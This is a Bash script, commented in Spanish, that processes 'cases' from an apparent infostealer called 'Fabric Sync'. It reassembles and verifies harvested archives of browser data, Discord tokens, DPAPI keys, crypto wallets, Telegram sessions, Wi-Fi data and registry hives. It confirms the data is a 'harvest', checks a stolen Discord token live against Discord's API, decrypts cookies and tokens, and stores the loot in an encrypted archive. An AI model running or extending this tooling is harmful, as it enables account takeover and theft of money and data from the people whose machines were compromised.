#!/usr/bin/env bash
# Ingesta, verifica, descifra y archiva cifrado un caso de Fabric Sync.
# No descarga de Discord: deja los adjuntos en <caso>/raw y ejecuta esto.
set -Eeuo pipefail
umask 077

usage() {
	cat <<'EOF'
Uso: tools/ingest-case.sh <directorio-del-caso> [opciones]

El directorio debe existir y contener raw/ con los adjuntos descargados.
Reensambla los .partNN, verifica todos los ZIP, extrae, descifra y archiva
el caso completo en <directorio-del-caso>.7z con AES-256 y nombres cifrados.

Opciones:
  --clean         borra work/ y decrypted/ tras verificar el archivo cifrado
  --prune         borra raw/ tras verificar el archivo cifrado
  --force         reutiliza work/ y decrypted/ existentes, sobrescribe el .7z
  --no-clean      desactiva --clean si viene de una variable
  -h, --help      esta ayuda

Contraseña: variable CASE_PASSWORD o se pide dos veces.
Salida: informe, token validado, SHA-256 del archivo y rutas finales.
EOF
}

die() {
	echo "ERROR: $*" >&2
	exit 1
}

warn() {
	echo "AVISO: $*" >&2
}

need() {
	command -v "$1" >/dev/null 2>&1 || die "falta el comando: $1"
}

CLEAN=0
PRUNE=0
FORCE=0
CASE=""

while (($#)); do
	case "$1" in
		--clean) CLEAN=1 ;;
		--no-clean) CLEAN=0 ;;
		--prune) PRUNE=1 ;;
		--force) FORCE=1 ;;
		-h|--help) usage; exit 0 ;;
		-*) die "opción desconocida: $1" ;;
		*) [[ -z "$CASE" ]] || die "sobra el argumento: $1"; CASE=$1 ;;
	esac
	shift
done

[[ -n "$CASE" ]] || { usage; exit 1; }
CASE=$(cd "$CASE" && pwd) || die "no existe el directorio del caso"
RAW="$CASE/raw"
WORK="$CASE/work"
DEC="$CASE/decrypted"
ARCHIVE="$CASE/$(basename "$CASE").7z"
SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
DECRYPT="$SCRIPT_DIR/../decrypt.py"

[[ -d "$RAW" ]] || die "falta $RAW; descarga ahí los adjuntos"
need 7z
need sha256sum
need python3
need sort
need find
[[ -x "$DECRYPT" ]] || die "no encuentro decrypt.py ejecutable en $DECRYPT"

if [[ -e "$WORK" && -n "$(find "$WORK" -mindepth 1 -maxdepth 1 -print -quit 2>/dev/null)" ]]; then
	((FORCE)) || die "$WORK ya tiene datos; usa --force"
	rm -rf "$WORK"
fi
if [[ -e "$DEC" && -n "$(find "$DEC" -mindepth 1 -maxdepth 1 -print -quit 2>/dev/null)" ]]; then
	((FORCE)) || die "$DEC ya tiene datos; usa --force"
	rm -rf "$DEC"
fi
if [[ -e "$ARCHIVE" ]]; then
	((FORCE)) || die "$ARCHIVE ya existe; usa --force"
	rm -f "$ARCHIVE"
fi

trap 'code=$?; if ((code != 0)); then echo "Fallo. Se conserva el caso en: $CASE" >&2; fi' EXIT

echo "== Caso: $CASE"
cd "$RAW"

# 1. Reensamblar cualquier familia .partNN.
echo "== Reensamblando partes"
mapfile -t PART_FILES < <(find "$RAW" -maxdepth 1 -type f -regextype posix-extended \
	-regex '.*\.part[0-9]+$' -printf '%f\n' | sort -V)
declare -A SEEN=()
BASES=()
for file in "${PART_FILES[@]}"; do
	base=${file%.part*}
	[[ -n "${SEEN[$base]:-}" ]] && continue
	SEEN[$base]=1
	BASES+=("$base")
done

for base in "${BASES[@]}"; do
	mapfile -t parts < <(find "$RAW" -maxdepth 1 -type f -name "$base.part*" -printf '%p\n' | sort -V)
	[[ ${#parts[@]} -gt 0 ]] || continue
	first=${parts[0]##*.part}
	[[ $((10#$first)) -eq 1 ]] || die "$base empieza en part$first, falta part01"
	expected=1
	for part in "${parts[@]}"; do
		number=$((10#${part##*.part}))
		[[ "$number" -eq "$expected" ]] || die "faltan partes de $base (esperaba $expected, hay $number)"
		expected=$((expected + 1))
	done
	tmp="$RAW/$base.reassembled"
	cat "${parts[@]}" > "$tmp"
	if [[ -f "$RAW/$base" ]]; then
		cmp -s "$tmp" "$RAW/$base" || die "$base existe y no coincide con sus partes"
		rm -f "$tmp"
		echo "   $base ya estaba completo (${#parts[@]} partes comprobadas)"
	else
		mv "$tmp" "$RAW/$base"
		echo "   $base reensamblado (${#parts[@]} partes)"
	fi
done

# 2. Verificar todos los ZIP.
echo "== Verificando archivos"
mapfile -t ZIPS < <(find "$RAW" -maxdepth 1 -type f -name '*.zip' -print | sort)
[[ ${#ZIPS[@]} -gt 0 ]] || die "no hay ningún .zip en $RAW"
for zip in "${ZIPS[@]}"; do
	7z t -bd "$zip" >/dev/null || die "ZIP corrupto: $zip"
	echo "   ok $(basename "$zip")"
done

mapfile -t SYNCS < <(find "$RAW" -maxdepth 1 -type f -name 'sync-*.zip' -print | sort)
[[ ${#SYNCS[@]} -gt 0 ]] || die "falta el harvest principal sync-*.zip"
SYNC=$(ls -1t "${SYNCS[@]}" | head -n 1)
if [[ ${#SYNCS[@]} -gt 1 ]]; then
	warn "hay ${#SYNCS[@]} sync-*.zip; uso el más reciente: $(basename "$SYNC")"
fi
7z l -bd "$SYNC" | grep -qE '(browsers|discord|dpapi|wallets)/' \
	|| die "el sync no parece un harvest (sin browsers/discord/dpapi/wallets)"

(
	cd "$RAW"
	sha256sum ./*.zip > "$CASE/SHA256-raw.txt"
)
echo "== SHA-256 de los originales: $CASE/SHA256-raw.txt"

# 3. Extraer sin duplicar la carpeta raíz de cada archivo.
echo "== Extrayendo"
mkdir -p "$WORK"
extract_into() {
	local archive=$1
	local dest=$2
	local tmp
	tmp=$(mktemp -d "$CASE/.extract.XXXXXX")
	7z x -y -bd -o"$tmp" "$archive" >/dev/null || die "no se pudo extraer $archive"
	mkdir -p "$dest"
	mapfile -d '' entries < <(find "$tmp" -mindepth 1 -maxdepth 1 -print0)
	if [[ ${#entries[@]} -eq 1 && -d "${entries[0]}" ]]; then
		cp -a "${entries[0]}/." "$dest/"
	else
		cp -a "$tmp/." "$dest/"
	fi
	rm -rf "$tmp"
}

for zip in "${ZIPS[@]}"; do
	name=$(basename "$zip")
	case "$name" in
		sync-*.zip) dest="$WORK" ;;
		discord.zip) dest="$WORK/discord/localstorage" ;;
		ext.zip) dest="$WORK/wallets/ext" ;;
		exodus.zip) dest="$WORK/wallets/exodus.wallet" ;;
		electrum.zip) dest="$WORK/wallets/electrum" ;;
		ledger.zip) dest="$WORK/wallets/ledger" ;;
		keys.zip) dest="$WORK/keys" ;;
		tdata.zip) dest="$WORK/sessions/tdata" ;;
		wifi.zip) dest="$WORK/wifi" ;;
		system-*.zip) dest="$WORK/hives" ;;
		*) dest="$WORK/other/${name%.zip}" ;;
	esac
	extract_into "$zip" "$dest"
	echo "   $(basename "$zip") -> ${dest#"$CASE"/}"
done

# 4. Comprobaciones del árbol.
echo "== Comprobando el árbol"
[[ -f "$WORK/discord/token.txt" ]] || warn "no hay discord/token.txt"
if ! find "$WORK/browsers" -path '*/abe/*.tsv' -print -quit 2>/dev/null | grep -q .; then
	warn "no hay TSV de ABE; revisa browsers/*/keys.txt por abe_error"
fi
for expected in dpapi/Protect browsers wallets; do
	[[ -e "$WORK/$expected" ]] || warn "falta $expected/"
done

TOKEN=""
if [[ -f "$WORK/discord/token.txt" ]]; then
	TOKEN=$(sed -n 's/^token=//p' "$WORK/discord/token.txt" | head -n 1)
	if [[ -n "$TOKEN" ]] && command -v curl >/dev/null 2>&1; then
		code=$(curl -s -o /dev/null --max-time 10 -w '%{http_code}' \
			-H "Authorization: $TOKEN" https://discord.com/api/v10/users/@me || true)
		if [[ "$code" == "200" ]]; then
			echo "   token Discord: válido"
		else
			warn "el token no valida ahora mismo (HTTP ${code:-sin red})"
		fi
	fi
fi

# 5. Descifrar.
echo "== Descifrando"
mkdir -p "$DEC"
set +e
python3 "$DECRYPT" "$WORK" -o "$DEC" -q --no-color > "$CASE/decrypt.log" 2>&1
DECRYPT_CODE=$?
set -e
cat "$CASE/decrypt.log"
((DECRYPT_CODE == 0)) || die "decrypt.py terminó con $DECRYPT_CODE; log en $CASE/decrypt.log"
[[ -s "$DEC/summary.txt" ]] || die "decrypt.py no generó summary.txt"

COOKIES=$(awk '$1=="cookies"{print $2}' "$DEC/summary.txt")
TOKENS=$(awk '$1=="tokens"{print $2}' "$DEC/summary.txt")
echo "== Resultado: cookies=${COOKIES:-0} tokens=${TOKENS:-0}"
[[ "${COOKIES:-0}" != "0" ]] || warn "0 cookies: revisa ABE y el fallback hives"
[[ "${TOKENS:-0}" != "0" ]] || warn "0 tokens: revisa discord/token.txt y el raw"

# 6. Archivar cifrado y verificar.
echo "== Archivando cifrado"
if [[ -n "${CASE_PASSWORD:-}" ]]; then
	PASSWORD=$CASE_PASSWORD
else
	[[ -t 0 ]] || die "define CASE_PASSWORD o ejecuta en una terminal"
	read -rsp "Contraseña del archivo (no se muestra): " PASSWORD
	echo
	read -rsp "Repite la contraseña: " PASSWORD2
	echo
	[[ "$PASSWORD" == "$PASSWORD2" ]] || die "las contraseñas no coinciden"
fi
[[ -n "$PASSWORD" ]] || die "contraseña vacía"

(
	cd "$CASE"
	7z a -t7z -mhe=on -mx=9 -p"$PASSWORD" "$ARCHIVE" \
		SHA256-raw.txt decrypt.log raw work decrypted >/dev/null
)
[[ -s "$ARCHIVE" ]] || die "no se creó el archivo"
7z t -bd -p"$PASSWORD" "$ARCHIVE" >/dev/null || die "el archivo cifrado no verifica"
echo "== Archivo verificado: $ARCHIVE"
sha256sum "$ARCHIVE"

# 7. Limpieza opcional, solo tras verificar.
if ((CLEAN)); then
	rm -rf "$WORK" "$DEC"
	echo "== work/ y decrypted/ eliminados (siguen dentro del .7z)"
fi
if ((PRUNE)); then
	rm -rf "$RAW"
	echo "== raw/ eliminado (los originales están dentro del .7z)"
fi

trap - EXIT
echo
echo "== Terminado"
echo "   archivo : $ARCHIVE"
echo "   descifrado (dentro del archivo): decrypted/"
echo "   resumen : cookies=${COOKIES:-0} tokens=${TOKENS:-0}"
echo "   conserva la contraseña fuera del caso"
